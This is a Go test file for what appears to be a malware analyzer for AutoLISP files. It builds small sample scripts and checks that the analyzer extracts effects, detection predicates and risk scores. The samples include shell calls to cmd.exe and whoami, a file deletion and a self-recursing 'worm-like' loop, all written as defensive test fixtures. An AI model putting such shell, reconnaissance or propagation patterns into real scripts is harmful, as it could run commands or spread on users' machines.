func createTestLSP(t *testing.T, name string, content string) string {
	t.Helper()
	tmpDir := t.TempDir()
	path := filepath.Join(tmpDir, name)
	if err := os.WriteFile(path, []byte(content), 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}
	return path
}

// createTestFAS creates a test FAS file (pseudo-compiled format)
func createTestFAS(t *testing.T, name string, content string) string {
	t.Helper()
	tmpDir := t.TempDir()
	path := filepath.Join(tmpDir, name)
	// FAS format: magic bytes + LISP source as pseudo-compiled
	magic := []byte{0x41, 0x43, 0x31, 0x30} // "AC10" magic
	data := append(magic, []byte(content)...)
	if err := os.WriteFile(path, data, 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}
	return path
}

// createTestVLX creates a test VLX file (Visual LISP format)
func createTestVLX(t *testing.T, name string, content string) string {
	t.Helper()
	tmpDir := t.TempDir()
	path := filepath.Join(tmpDir, name)
	// VLX format: VL-X magic + content
	magic := []byte{0x56, 0x4C, 0x2D, 0x58} // "VL-X" magic
	data := append(magic, []byte(content)...)
	if err := os.WriteFile(path, data, 0644); err != nil {
		t.Fatalf("failed to write test file: %v", err)
	}
	return path
}

// TestFileTypeSupport verifies that .lsp, .fas, .vlx files can all be analyzed.
func TestFileTypeSupport(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	content := `(defun test-func () (print "hello"))`

	// Test LSP
	lspFile := createTestLSP(t, "test.lsp", content)
	result, err := a.AnalyzeFile(context.Background(), lspFile, false)
	if err != nil {
		t.Errorf("failed to analyze .lsp: %v", err)
	} else {
		t.Logf("LSP analyzed: InputType=%s, Functions=%d", result.InputType, len(result.IRFunctions))
	}

	// Test FAS (expected to fail with dummy data - just verify extension handling)
	fasFile := createTestFAS(t, "test.fas", content)
	result, err = a.AnalyzeFile(context.Background(), fasFile, false)
	if err != nil {
		t.Logf("FAS analysis failed (expected with dummy data): %v", err)
	} else {
		t.Logf("FAS analyzed: InputType=%s, Functions=%d", result.InputType, len(result.IRFunctions))
	}

	// Test VLX (expected to fail with dummy data - just verify extension handling)
	vlxFile := createTestVLX(t, "test.vlx", content)
	result, err = a.AnalyzeFile(context.Background(), vlxFile, false)
	if err != nil {
		t.Logf("VLX analysis failed (expected with dummy data): %v", err)
	} else {
		t.Logf("VLX analyzed: InputType=%s, Functions=%d", result.InputType, len(result.IRFunctions))
	}
}

// TestSemanticTagGeneration verifies that semantic tags are generated from effects.
func TestSemanticTagGeneration(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	// File with various effect types
	content := `(defun multi-effect ()
  (write-line "data" "C:\\test.txt")
  (shell "cmd.exe")
  (if (file-exists-p "C:\\Windows")
    (delete-file "old.txt")))`

	file := createTestLSP(t, "effects.lsp", content)
	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// Verify effects were extracted
	if len(result.AllEffects) == 0 {
		t.Errorf("expected effects to be extracted")
	}

	// Verify semantic tags were generated (via context score calculation)
	if result.ScoreResult == nil || result.ScoreResult.ContextScore == nil {
		t.Errorf("context score should be calculated using semantic tags")
	}
}

// TestFormalPredicateResults verifies that formal predicate results are stored.
func TestFormalPredicateResults(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	// File with potential worm-like behavior (file ops in cycle)
	content := `(defun worm-like ()
  (write-line "copy" "C:\\dest.txt")
  (if (not (file-exists-p "stop.txt"))
    (worm-like)))`

	file := createTestLSP(t, "worm.lsp", content)
	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// Verify predicate results exist
	if result.PredicateResults == nil {
		t.Errorf("PredicateResults should not be nil")
		return
	}

	requiredPredicates := []string{"worm", "stealth_persistence", "propagation_closure"}
	for _, name := range requiredPredicates {
		if _, ok := result.PredicateResults[name]; !ok {
			t.Errorf("predicate result missing: %s", name)
		}
	}
}

// TestEnvCheckPropagation verifies environment checks flow from IR to scoring.
func TestEnvCheckPropagation(t *testing.T) {
	cfg, _ := config.Load("")
	a, err := New(cfg)
	if err != nil {
		t.Fatalf("failed to create analyzer: %v", err)
	}

	// File with environment checks
	content := `(defun env-check ()
  (if (and (file-exists-p "C:\\Windows")
           (file-exists-p "C:\\Users"))
    (progn
      (shell "whoami")
      (write-line "data" "output.txt"))))`

	file := createTestLSP(t, "env.lsp", content)
	result, err := a.AnalyzeFile(context.Background(), file, false)
	if err != nil {
		t.Fatalf("failed to analyze: %v", err)
	}

	// The env checks should have been counted in formal scoring
	if result.FormalScoreResult == nil {
		t.Errorf("FormalScoreResult should not be nil")
		return
	}

	t.Logf("FormalScore: Cycle=%.2f, Propagation=%.2f, Entropy=%.2f, EnvRisk=%.2f",
		result.FormalScoreResult.Cycle,
		result.FormalScoreResult.Propagation,
		result.FormalScoreResult.Entropy,
		result.FormalScoreResult.EnvRisk)

	// EnvRisk should be > 0 if env checks were detected
	// (the exact value depends on normalization)
}

// containsStr checks if a string contains a substring
func containsStr(s, substr string) bool {
	return strings.Contains(s, substr)
}
